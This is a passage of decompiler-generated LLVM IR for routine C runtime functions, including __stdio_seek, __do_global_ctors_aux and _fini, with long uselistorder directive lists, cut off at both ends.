  %v1_805075d.neg = zext i1 %tmp to i32
  %v4_8050764 = add i32 %v3_8050758, %v1_805075d.neg
  %v5_8050764 = add i32 %v4_8050764, %v3_8050764
  store i32 %v5_8050764, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %v2_8050762, i32* %v1_8050756, align 4
  %v0_805076f = load i32, i32* %edx.global-to-local, align 4
  %v1_805076f = load i32, i32* %ebp.global-to-local, align 4
  %v2_805076f = add i32 %v1_805076f, 4
  %v3_805076f = inttoptr i32 %v2_805076f to i32*
  store i32 %v0_805076f, i32* %v3_805076f, align 4
  %v0_8050772 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050772 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050772 = sub i32 %v0_8050772, %v1_8050772
  %v8_8050772 = xor i32 %v1_8050772, %v0_8050772
  %v9_8050772 = xor i32 %v2_8050772, %v0_8050772
  %v10_8050772 = and i32 %v9_8050772, %v8_8050772
  %v11_8050772 = icmp slt i32 %v10_8050772, 0
  %v13_8050772 = icmp slt i32 %v2_8050772, 0
  %v2_8050774 = icmp eq i1 %v13_8050772, %v11_8050772
  br i1 %v2_8050774, label %dec_label_pc_8050776, label %dec_label_pc_805077e

dec_label_pc_8050776:                             ; preds = %dec_label_pc_805073d
  %v12_8050772 = icmp eq i32 %v2_8050772, 0
  %v4_8050776 = icmp eq i1 %v12_8050772, false
  br i1 %v4_8050776, label %dec_label_pc_805077c, label %dec_label_pc_8050778

dec_label_pc_8050778:                             ; preds = %dec_label_pc_8050776
  %v0_8050778 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050778 = load i32, i32* %ecx.global-to-local, align 4
  %tmp12 = icmp ugt i32 %v0_8050778, %v1_8050778
  br i1 %tmp12, label %dec_label_pc_805077c, label %dec_label_pc_805077e

dec_label_pc_805077c:                             ; preds = %dec_label_pc_8050778, %dec_label_pc_8050776
  %v0_805077c = load i32, i32* %esi.global-to-local, align 4
  %v1_805077c = sub i32 0, %v0_805077c
  store i32 %v1_805077c, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805077e

dec_label_pc_805077e:                             ; preds = %dec_label_pc_8050778, %dec_label_pc_805073d, %dec_label_pc_805077c
  %v0_805077e = load i32, i32* %esi.global-to-local, align 4
  %v2_805077e = icmp slt i32 %v0_805077e, 0
  %v1_8050780 = icmp eq i1 %v2_805077e, false
  br i1 %v1_8050780, label %dec_label_pc_8050792, label %dec_label_pc_8050782

dec_label_pc_8050782:                             ; preds = %dec_label_pc_805077e
  %v0_8050782 = load i32, i32* %stack_var_-16, align 4
  %v1_8050782 = call i32 @__GI___errno_location(i32 %v0_8050782)
  %v1_8050787 = inttoptr i32 %v1_8050782 to i32*
  store i32 75, i32* %v1_8050787, align 4
  %v0_8050792.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050792

dec_label_pc_805078f:                             ; preds = %dec_label_pc_8050725, %dec_label_pc_8050720
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050792

dec_label_pc_8050792:                             ; preds = %dec_label_pc_805077e, %dec_label_pc_8050782, %dec_label_pc_805078f
  %v0_8050792 = phi i32 [ %v0_805077e, %dec_label_pc_805077e ], [ %v0_8050792.pre, %dec_label_pc_8050782 ], [ -1, %dec_label_pc_805078f ]
  %v2_8050794 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050794, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8050792

; uselistorder directives
  uselistorder i32 %v2_8050772, { 2, 1, 0 }
  uselistorder i32 %v2_805074f, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050718, { 0, 2, 1 }
  uselistorder i32 %v1_8050711, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8050708, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 %tmp4, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 4, 2, 1, 3, 5, 6 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i32 (i32)* @__GI___errno_location, { 67, 66, 65, 64, 36, 35, 63, 62, 61, 57, 34, 25, 33, 32, 22, 60, 59, 58, 31, 24, 56, 55, 13, 12, 52, 47, 11, 10, 19, 18, 30, 16, 15, 0, 54, 53, 51, 50, 49, 48, 5, 4, 7, 46, 3, 27, 41, 2, 9, 21, 20, 45, 44, 43, 8, 6, 40, 14, 23, 42, 1, 17, 39, 26, 29, 38, 37, 28 }
  uselistorder i32 16, { 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 13, 68, 69, 70, 71, 33, 34, 35, 36, 37, 38, 19, 39, 40, 41, 42, 20, 5, 43, 44, 45, 46, 74, 75, 76, 12, 78, 79, 80, 81, 82, 2, 95, 96, 51, 52, 53, 54, 47, 48, 72, 73, 49, 50, 6, 97, 98, 99, 0, 7, 100, 83, 84, 85, 86, 87, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 11, 3, 114, 115, 116, 117, 55, 56, 57, 14, 21, 4, 77, 18, 58, 88, 59, 9, 118, 8, 119, 1, 10, 60, 61, 62, 63, 64, 65, 66, 67, 15, 89, 16, 17, 90, 91, 92, 93, 94 }
  uselistorder i32 8, { 34, 55, 56, 57, 58, 59, 60, 61, 35, 62, 63, 64, 93, 94, 95, 96, 97, 98, 99, 3, 100, 14, 15, 54, 65, 52, 18, 66, 68, 69, 70, 67, 71, 72, 73, 74, 19, 37, 75, 76, 77, 78, 79, 80, 36, 16, 38, 102, 103, 104, 105, 39, 21, 2, 20, 43, 106, 40, 22, 23, 24, 25, 26, 41, 42, 17, 13, 44, 81, 112, 113, 114, 115, 116, 82, 83, 84, 101, 117, 118, 119, 120, 121, 122, 123, 124, 125, 107, 108, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 47, 45, 46, 48, 138, 139, 27, 28, 140, 85, 86, 87, 88, 187, 31, 188, 189, 32, 53, 29, 89, 110, 109, 90, 91, 141, 142, 143, 144, 145, 146, 147, 4, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 5, 158, 159, 160, 50, 6, 161, 51, 7, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 49, 179, 180, 8, 181, 182, 183, 184, 185, 9, 186, 10, 30, 0, 92, 111, 1, 33, 12, 11 }
  uselistorder i32 20, { 4, 9, 5, 10, 11, 25, 26, 12, 13, 14, 15, 1, 2, 29, 0, 16, 30, 17, 18, 27, 28, 19, 20, 31, 32, 33, 34, 35, 36, 37, 38, 39, 6, 40, 21, 22, 23, 24, 3, 8, 7 }
  uselistorder i32 64, { 1, 0, 8, 4, 15, 5, 9, 10, 14, 11, 12, 6, 2, 7, 13, 3 }
  uselistorder i32 2, { 67, 68, 83, 84, 26, 69, 70, 49, 0, 40, 41, 85, 53, 19, 20, 21, 27, 28, 86, 64, 87, 88, 89, 90, 91, 92, 71, 72, 73, 39, 1, 2, 74, 23, 3, 75, 4, 42, 76, 77, 93, 94, 95, 96, 30, 29, 37, 98, 100, 99, 101, 65, 102, 103, 22, 78, 31, 79, 80, 104, 105, 32, 54, 113, 5, 6, 7, 43, 44, 38, 55, 106, 34, 33, 35, 107, 24, 108, 114, 8, 45, 115, 46, 119, 56, 66, 63, 117, 118, 36, 9, 97, 25, 57, 10, 11, 12, 13, 116, 14, 15, 50, 47, 81, 51, 52, 82, 58, 59, 60, 61, 16, 17, 111, 48, 109, 18, 110, 112, 62 }
  uselistorder i32 44, { 3, 4, 13, 14, 5, 6, 7, 8, 1, 17, 18, 9, 10, 15, 16, 11, 12, 19, 20, 2, 24, 25, 26, 27, 21, 22, 23, 0 }
  uselistorder i32 40, { 4, 10, 11, 5, 6, 7, 8, 9, 14, 15, 16, 0, 1, 2, 17, 18, 12, 19, 3, 13 }
  uselistorder i32 3, { 27, 3, 4, 17, 2, 23, 13, 29, 30, 31, 32, 9, 6, 7, 5, 33, 8, 18, 19, 28, 1, 12, 0, 14, 26, 35, 21, 34, 10, 24, 11, 25, 22, 15, 16, 20 }
  uselistorder i32 2048, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050792, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805077e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805073d, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp4 = ptrtoint i32* %arg2 to i32
  %v0_805079c = load i32, i32* @ebx, align 4
  store i32 %tmp4, i32* @ebx, align 4
  %v1_80507a5 = add i32 %tmp4, 4
  %v2_80507a5 = inttoptr i32 %v1_80507a5 to i32*
  %v3_80507a5 = load i32, i32* %v2_80507a5, align 4
  %v2_80507a8 = load i32, i32* %arg2, align 4
  %v1_80507ae = add i32 %arg1, 4
  %v2_80507ae = inttoptr i32 %v1_80507ae to i32*
  %v3_80507ae = load i32, i32* %v2_80507ae, align 4
  %v5_80507b1 = call i32 @__GI_lseek64(i32 %v3_80507ae, i32 %v2_80507a8, i32 %v3_80507a5, i32 %arg3, i32 %v0_805079c)
  %v0_80507bb = load i32, i32* @edx, align 4
  %v2_80507bb = icmp slt i32 %v0_80507bb, 0
  br i1 %v2_80507bb, label %dec_label_pc_80507c6, label %dec_label_pc_80507bf

dec_label_pc_80507bf:                             ; preds = %entry
  %v1_80507bf = load i32, i32* @ebx, align 4
  %v2_80507bf = inttoptr i32 %v1_80507bf to i32*
  store i32 %v5_80507b1, i32* %v2_80507bf, align 4
  %v0_80507c1 = load i32, i32* @edx, align 4
  %v1_80507c1 = load i32, i32* @ebx, align 4
  %v2_80507c1 = add i32 %v1_80507c1, 4
  %v3_80507c1 = inttoptr i32 %v2_80507c1 to i32*
  store i32 %v0_80507c1, i32* %v3_80507c1, align 4
  br label %dec_label_pc_80507c6

dec_label_pc_80507c6:                             ; preds = %entry, %dec_label_pc_80507bf
  %v0_80507c6 = phi i32 [ %v5_80507b1, %entry ], [ 0, %dec_label_pc_80507bf ]
  ret i32 %v0_80507c6

; uselistorder directives
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32* @edx, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 0, 33, 34, 31, 8, 35, 36, 21, 3, 37, 38, 40, 41, 11, 39, 9, 52, 53, 42, 44, 43, 54, 56, 55, 65, 4, 66, 67, 58, 1, 5, 2, 10, 64, 68, 69, 70, 71, 74, 72, 73, 75, 76, 77, 78, 87, 45, 88, 90, 91, 93, 92, 89, 46, 47, 81, 82, 6, 83, 80, 84, 85, 7, 86, 79, 48, 49, 50, 51, 57, 59, 60, 61, 62, 63, 94 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_lseek64, { 1, 0 }
  uselistorder i32 4, { 70, 71, 72, 73, 74, 4, 5, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 56, 86, 87, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 88, 89, 6, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 44, 108, 68, 109, 37, 110, 111, 112, 113, 161, 162, 45, 163, 164, 165, 166, 167, 168, 7, 38, 169, 170, 171, 172, 173, 174, 186, 2, 175, 176, 177, 182, 178, 179, 39, 8, 180, 181, 183, 184, 46, 185, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 47, 48, 49, 50, 200, 201, 202, 114, 115, 116, 203, 204, 205, 40, 224, 225, 121, 122, 123, 117, 118, 159, 160, 119, 120, 57, 226, 227, 228, 229, 230, 231, 232, 233, 9, 235, 234, 236, 10, 206, 207, 11, 41, 42, 237, 238, 239, 13, 12, 240, 241, 63, 242, 243, 14, 244, 58, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 51, 256, 300, 15, 124, 125, 126, 127, 16, 128, 301, 302, 306, 307, 309, 310, 311, 17, 303, 304, 305, 54, 67, 18, 129, 130, 131, 64, 212, 213, 214, 208, 209, 210, 211, 132, 133, 134, 135, 19, 136, 137, 308, 259, 260, 261, 262, 263, 264, 265, 20, 266, 267, 268, 269, 270, 271, 272, 273, 257, 258, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 34, 295, 296, 297, 55, 299, 298, 21, 138, 139, 140, 22, 3, 23, 141, 52, 53, 142, 143, 24, 65, 25, 35, 26, 0, 27, 28, 29, 144, 30, 145, 62, 31, 36, 32, 1, 59, 60, 66, 215, 61, 216, 217, 218, 219, 220, 221, 222, 33, 43, 223, 69 }
  uselistorder label %dec_label_pc_80507c6, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp5, i32* %stack_var_-16, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-12, align 4
  %v0_80507d7 = load i32, i32* @global_var_8053300.73, align 256
  %v10_80507dc = icmp eq i32 %v0_80507d7, -1
  br i1 %v10_80507dc, label %dec_label_pc_8050800, label %dec_label_pc_80507e1

dec_label_pc_80507e1:                             ; preds = %entry
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80507f0

dec_label_pc_80507f0:                             ; preds = %dec_label_pc_80507f0, %dec_label_pc_80507e1
  %v4_80507f0 = phi i32 [ %v3_80507f2, %dec_label_pc_80507f0 ], [ %v0_80507d7, %dec_label_pc_80507e1 ]
  call void @__pseudo_call(i32 %v4_80507f0)
  %v0_80507f2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80507f2 = add i32 %v0_80507f2, ptrtoint (i32* @global_var_80532fc.4 to i32)
  %v2_80507f2 = inttoptr i32 %v1_80507f2 to i32*
  %v3_80507f2 = load i32, i32* %v2_80507f2, align 4
  %v1_80507f8 = add i32 %v0_80507f2, -4
  store i32 %v1_80507f8, i32* %ebx.global-to-local, align 4
  %v10_80507fb = icmp eq i32 %v3_80507f2, -1
  %v1_80507fe = icmp eq i1 %v10_80507fb, false
  br i1 %v1_80507fe, label %dec_label_pc_80507f0, label %dec_label_pc_8050800.loopexit

dec_label_pc_8050800.loopexit:                    ; preds = %dec_label_pc_80507f0
  %v2_8050800.pre = load i32, i32* %stack_var_-16, align 4
  %v2_8050801.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8050800

dec_label_pc_8050800:                             ; preds = %dec_label_pc_8050800.loopexit, %entry
  %v2_8050801 = phi i32 [ %v2_8050801.pre, %dec_label_pc_8050800.loopexit ], [ %tmp6, %entry ]
  %v2_8050800 = phi i32 [ %v2_8050800.pre, %dec_label_pc_8050800.loopexit ], [ %tmp5, %entry ]
  store i32 %v2_8050801, i32* %ebx.global-to-local, align 4
  ret i32 %v2_8050800

; uselistorder directives
  uselistorder i32 %v0_80507d7, { 1, 0 }
  uselistorder i1 false, { 348, 77, 78, 79, 80, 81, 65, 232, 231, 233, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 64, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 33, 120, 119, 49, 121, 122, 123, 239, 236, 237, 50, 234, 235, 238, 240, 241, 242, 243, 124, 125, 126, 51, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 1, 147, 148, 150, 36, 149, 2, 151, 152, 153, 154, 155, 157, 34, 158, 156, 159, 162, 160, 161, 3, 163, 164, 166, 165, 52, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 74, 75, 192, 244, 245, 246, 247, 248, 249, 250, 53, 251, 252, 253, 254, 266, 261, 262, 263, 54, 264, 267, 268, 269, 265, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 281, 282, 283, 284, 0, 193, 195, 196, 197, 198, 194, 199, 200, 201, 203, 202, 285, 286, 291, 37, 287, 6, 5, 288, 289, 290, 4, 292, 293, 298, 297, 294, 295, 296, 7, 299, 349, 350, 351, 352, 353, 48, 354, 38, 355, 356, 204, 207, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 300, 301, 303, 302, 304, 305, 306, 307, 308, 323, 325, 324, 9, 8, 370, 10, 222, 11, 371, 373, 372, 12, 223, 224, 225, 374, 375, 376, 309, 379, 377, 378, 13, 39, 380, 381, 382, 383, 385, 384, 55, 386, 388, 387, 56, 389, 66, 390, 391, 392, 58, 393, 57, 394, 395, 396, 397, 398, 399, 400, 401, 67, 402, 403, 404, 405, 406, 407, 408, 409, 410, 413, 447, 448, 449, 40, 205, 206, 208, 210, 209, 211, 414, 415, 416, 450, 466, 467, 468, 469, 470, 472, 59, 473, 474, 471, 465, 451, 68, 69, 72, 70, 71, 14, 73, 452, 455, 16, 456, 460, 457, 458, 459, 15, 255, 256, 257, 258, 259, 260, 17, 311, 18, 312, 313, 310, 212, 461, 462, 463, 464, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 417, 430, 431, 432, 433, 434, 435, 436, 437, 35, 439, 438, 19, 444, 440, 441, 442, 443, 445, 446, 213, 411, 412, 280, 453, 454, 219, 214, 60, 215, 20, 216, 217, 218, 220, 221, 226, 227, 229, 228, 21, 230, 314, 315, 316, 317, 318, 319, 63, 320, 41, 321, 42, 322, 326, 327, 343, 328, 329, 330, 331, 336, 340, 341, 342, 22, 332, 61, 333, 334, 335, 43, 26, 337, 25, 44, 24, 338, 339, 23, 344, 27, 345, 45, 346, 28, 29, 30, 46, 31, 347, 47, 32, 76, 62, 475 }
  uselistorder i32 -4, { 13, 14, 15, 9, 76, 77, 78, 79, 16, 4, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 87, 31, 32, 33, 34, 35, 5, 36, 37, 38, 39, 40, 41, 42, 43, 6, 44, 45, 46, 7, 47, 8, 48, 49, 50, 51, 52, 53, 54, 55, 88, 89, 56, 57, 58, 80, 0, 91, 92, 10, 93, 94, 95, 11, 1, 2, 3, 96, 90, 97, 98, 99, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 112, 114, 81, 82, 83, 84, 113, 101, 102, 103, 12, 104, 105, 100, 106, 107, 108, 109, 110, 111, 85, 86, 71, 72, 73, 74, 75 }
  uselistorder void (i32)* @__pseudo_call, { 5, 2, 3, 4, 7, 0, 8, 9, 10, 6, 1 }
  uselistorder i32 -1, { 42, 43, 73, 152, 153, 74, 139, 140, 141, 154, 142, 155, 157, 156, 71, 158, 159, 70, 160, 225, 161, 75, 76, 162, 77, 163, 143, 164, 78, 165, 39, 166, 138, 80, 79, 167, 168, 169, 82, 81, 83, 170, 226, 44, 171, 84, 172, 85, 86, 236, 87, 173, 88, 227, 174, 228, 89, 12, 10, 8, 13, 9, 11, 14, 34, 35, 175, 176, 229, 230, 15, 177, 178, 231, 1, 2, 45, 46, 0, 150, 151, 179, 180, 5, 137, 90, 91, 92, 93, 94, 3, 95, 237, 238, 239, 240, 48, 241, 242, 181, 243, 6, 244, 182, 47, 247, 16, 17, 18, 19, 20, 21, 22, 49, 25, 29, 38, 68, 183, 184, 50, 51, 98, 97, 96, 135, 136, 28, 27, 26, 185, 99, 186, 187, 248, 249, 30, 235, 144, 188, 36, 37, 23, 24, 189, 100, 101, 102, 103, 4, 104, 190, 52, 105, 191, 250, 255, 256, 257, 258, 251, 252, 192, 31, 106, 193, 107, 194, 195, 108, 259, 196, 260, 197, 198, 53, 199, 200, 201, 54, 109, 232, 55, 110, 111, 112, 113, 114, 115, 116, 117, 56, 202, 32, 118, 145, 120, 119, 121, 203, 122, 204, 33, 205, 146, 206, 57, 207, 263, 60, 59, 61, 62, 41, 208, 40, 63, 64, 58, 264, 7, 209, 210, 211, 123, 124, 65, 69, 72, 261, 212, 262, 245, 246, 265, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 66, 233, 234, 254, 253, 213, 147, 214, 67, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 148, 149 }
  uselistorder i32 1, { 410, 409, 210, 288, 411, 48, 47, 45, 46, 49, 44, 323, 275, 413, 412, 75, 76, 728, 289, 729, 730, 414, 192, 193, 731, 732, 348, 655, 656, 657, 290, 347, 658, 415, 659, 291, 660, 661, 428, 427, 426, 425, 424, 423, 422, 421, 420, 419, 418, 417, 416, 218, 217, 211, 219, 213, 214, 212, 215, 216, 662, 663, 0, 28, 29, 31, 30, 32, 429, 220, 221, 13, 14, 257, 664, 665, 430, 397, 12, 10, 11, 666, 431, 151, 155, 156, 153, 157, 154, 152, 667, 324, 434, 433, 432, 435, 186, 292, 293, 343, 276, 733, 437, 436, 101, 102, 734, 438, 222, 223, 735, 439, 225, 224, 736, 737, 227, 226, 738, 440, 668, 669, 408, 442, 441, 198, 197, 670, 671, 443, 444, 672, 673, 651, 295, 674, 675, 676, 677, 678, 679, 680, 681, 682, 296, 684, 253, 683, 252, 260, 261, 294, 685, 297, 686, 687, 688, 448, 447, 446, 445, 163, 165, 161, 166, 162, 164, 167, 689, 449, 139, 141, 143, 140, 142, 298, 451, 450, 144, 690, 691, 452, 16, 15, 692, 693, 279, 278, 274, 694, 695, 1, 2, 696, 3, 277, 697, 299, 698, 699, 454, 453, 203, 204, 205, 300, 349, 4, 350, 5, 262, 455, 458, 457, 456, 138, 459, 461, 460, 146, 463, 462, 464, 169, 739, 467, 466, 465, 468, 228, 740, 741, 280, 344, 325, 742, 743, 281, 471, 470, 469, 398, 18, 17, 19, 744, 745, 746, 751, 752, 753, 301, 302, 474, 473, 472, 231, 230, 229, 232, 755, 475, 233, 754, 476, 234, 305, 756, 757, 758, 282, 759, 760, 303, 761, 263, 304, 762, 763, 306, 764, 765, 766, 767, 768, 769, 772, 478, 477, 74, 72, 73, 773, 774, 258, 479, 106, 104, 105, 259, 700, 701, 702, 703, 704, 326, 705, 706, 707, 483, 482, 481, 480, 399, 110, 708, 709, 485, 484, 173, 171, 172, 175, 174, 327, 775, 776, 254, 264, 777, 778, 486, 307, 779, 780, 781, 489, 488, 487, 37, 35, 34, 33, 36, 383, 782, 783, 784, 785, 490, 112, 113, 114, 116, 115, 111, 786, 787, 491, 190, 189, 188, 492, 493, 109, 830, 831, 832, 494, 97, 94, 98, 95, 96, 308, 495, 128, 496, 134, 136, 135, 137, 498, 497, 107, 499, 108, 132, 131, 133, 500, 93, 91, 92, 501, 89, 88, 90, 503, 502, 504, 99, 249, 351, 505, 328, 506, 833, 834, 835, 836, 510, 509, 508, 507, 235, 236, 352, 511, 50, 51, 6, 788, 345, 789, 283, 515, 514, 513, 512, 39, 42, 40, 41, 43, 329, 330, 802, 803, 804, 805, 265, 837, 838, 518, 517, 516, 20, 23, 22, 21, 519, 723, 724, 839, 840, 841, 842, 843, 520, 246, 247, 725, 521, 117, 522, 844, 845, 523, 846, 847, 848, 309, 70, 331, 849, 524, 400, 60, 353, 354, 355, 850, 525, 356, 250, 357, 851, 310, 7, 527, 526, 237, 358, 528, 238, 359, 852, 853, 529, 239, 530, 121, 120, 854, 532, 531, 240, 384, 533, 534, 26, 27, 360, 535, 361, 855, 856, 857, 858, 859, 860, 861, 285, 862, 539, 538, 537, 536, 25, 362, 863, 864, 363, 364, 865, 541, 540, 542, 176, 543, 866, 867, 868, 869, 870, 871, 385, 401, 77, 78, 79, 365, 311, 545, 544, 8, 546, 332, 548, 547, 550, 549, 366, 552, 551, 24, 553, 194, 554, 100, 555, 119, 556, 557, 558, 170, 80, 559, 168, 560, 195, 561, 562, 52, 53, 910, 911, 912, 913, 564, 563, 57, 56, 58, 55, 54, 59, 914, 333, 565, 567, 566, 241, 334, 386, 654, 652, 650, 568, 907, 653, 909, 569, 367, 570, 747, 748, 749, 382, 750, 572, 571, 122, 126, 123, 124, 125, 335, 573, 129, 130, 790, 266, 791, 575, 402, 574, 185, 182, 184, 183, 576, 85, 81, 82, 83, 87, 86, 84, 63, 61, 62, 64, 65, 368, 577, 369, 578, 370, 579, 371, 581, 580, 387, 583, 582, 242, 243, 372, 875, 876, 877, 585, 584, 207, 206, 208, 878, 879, 255, 880, 881, 882, 587, 586, 68, 66, 67, 69, 388, 874, 312, 244, 245, 374, 588, 883, 884, 885, 886, 887, 373, 888, 889, 890, 891, 892, 893, 286, 894, 895, 251, 390, 896, 897, 898, 899, 900, 336, 389, 901, 902, 903, 904, 905, 906, 593, 592, 591, 590, 589, 177, 179, 181, 180, 178, 337, 391, 594, 338, 392, 313, 597, 596, 595, 393, 598, 599, 600, 601, 602, 603, 604, 872, 873, 606, 605, 158, 159, 160, 770, 771, 607, 150, 149, 148, 346, 908, 608, 609, 145, 610, 103, 611, 196, 612, 202, 613, 187, 614, 147, 615, 191, 616, 127, 617, 118, 618, 209, 710, 267, 268, 380, 287, 711, 712, 713, 256, 379, 714, 715, 716, 375, 717, 718, 719, 339, 314, 720, 376, 394, 623, 622, 621, 620, 619, 403, 404, 200, 199, 201, 395, 721, 722, 624, 726, 727, 792, 627, 626, 625, 793, 794, 628, 340, 377, 315, 795, 796, 635, 634, 633, 632, 631, 630, 629, 797, 798, 284, 341, 799, 316, 317, 800, 801, 637, 636, 405, 248, 806, 807, 639, 638, 808, 809, 810, 818, 819, 273, 820, 641, 640, 38, 378, 9, 643, 642, 406, 318, 811, 270, 812, 813, 319, 814, 269, 816, 817, 320, 342, 396, 815, 407, 821, 644, 822, 823, 71, 824, 825, 321, 826, 827, 828, 271, 646, 645, 322, 829, 381, 272, 648, 647, 649 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_8050807 = load i32, i32* @ebx, align 4
  %v1_8050808 = call i32 @__get_pc_thunk_bx(i32 %v0_8050807)
  store i32 %v1_8050808, i32* @eax, align 4
  %v0_8050813 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_8050813

; uselistorder directives
  uselistorder i32* @eax, { 48, 17, 16, 73, 74, 50, 52, 51, 53, 54, 56, 49, 55, 57, 75, 18, 40, 36, 82, 19, 20, 21, 22, 23, 76, 24, 25, 26, 77, 27, 28, 29, 30, 31, 78, 32, 33, 34, 35, 81, 37, 83, 80, 79, 84, 85, 86, 87, 88, 89, 0, 90, 38, 91, 92, 58, 59, 61, 13, 60, 93, 95, 94, 103, 104, 96, 39, 105, 106, 107, 108, 41, 42, 7, 109, 110, 111, 62, 64, 63, 120, 121, 123, 47, 124, 3, 122, 12, 112, 43, 118, 2, 44, 46, 1, 45, 119, 65, 114, 113, 115, 117, 116, 4, 5, 66, 67, 68, 69, 70, 71, 14, 15, 72, 8, 97, 9, 98, 99, 10, 100, 101, 102, 125, 6, 11 }
  uselistorder i32 0, { 429, 103, 520, 521, 522, 524, 523, 525, 10, 225, 105, 104, 526, 527, 226, 528, 529, 430, 272, 530, 531, 532, 533, 534, 89, 106, 722, 720, 721, 431, 723, 107, 90, 535, 108, 536, 12, 76, 81, 537, 202, 432, 433, 538, 281, 539, 540, 541, 542, 543, 544, 545, 546, 547, 109, 434, 548, 549, 550, 551, 110, 552, 111, 199, 282, 78, 112, 435, 436, 437, 227, 228, 283, 553, 554, 555, 113, 556, 438, 229, 273, 274, 557, 558, 559, 560, 561, 562, 439, 230, 563, 114, 82, 440, 564, 115, 231, 232, 565, 566, 441, 567, 568, 569, 442, 570, 571, 572, 573, 91, 574, 443, 203, 444, 116, 575, 117, 576, 724, 220, 221, 729, 725, 727, 726, 728, 204, 730, 731, 732, 406, 733, 734, 735, 736, 737, 738, 118, 577, 578, 96, 579, 119, 445, 580, 205, 284, 285, 581, 120, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 121, 446, 122, 594, 233, 595, 596, 597, 598, 599, 83, 123, 447, 222, 84, 600, 601, 602, 603, 13, 604, 605, 606, 14, 448, 607, 407, 124, 449, 608, 609, 610, 613, 611, 612, 15, 43, 450, 614, 615, 616, 617, 275, 618, 619, 286, 451, 620, 125, 621, 452, 206, 622, 623, 624, 625, 627, 628, 629, 630, 631, 632, 453, 454, 633, 126, 455, 456, 80, 634, 457, 635, 636, 637, 638, 639, 458, 640, 459, 641, 642, 234, 460, 235, 643, 644, 645, 16, 646, 647, 17, 44, 45, 46, 47, 648, 127, 461, 649, 650, 408, 651, 652, 128, 462, 87, 42, 18, 626, 207, 236, 653, 664, 665, 741, 742, 892, 129, 743, 463, 744, 745, 746, 747, 464, 130, 748, 237, 749, 750, 465, 751, 752, 753, 754, 755, 276, 277, 756, 757, 758, 759, 131, 287, 760, 761, 208, 762, 132, 763, 764, 765, 766, 767, 768, 769, 770, 787, 776, 777, 238, 778, 779, 780, 781, 782, 209, 783, 784, 785, 786, 788, 789, 223, 790, 288, 289, 791, 792, 802, 803, 793, 794, 795, 796, 797, 798, 799, 800, 801, 48, 49, 804, 810, 811, 805, 806, 807, 808, 809, 50, 51, 812, 813, 814, 815, 422, 816, 818, 817, 819, 820, 821, 822, 823, 824, 825, 826, 261, 290, 466, 97, 827, 828, 239, 831, 832, 54, 55, 829, 830, 19, 20, 52, 53, 467, 833, 134, 135, 133, 654, 655, 656, 57, 468, 657, 658, 659, 423, 660, 56, 136, 469, 291, 137, 470, 59, 58, 471, 472, 292, 138, 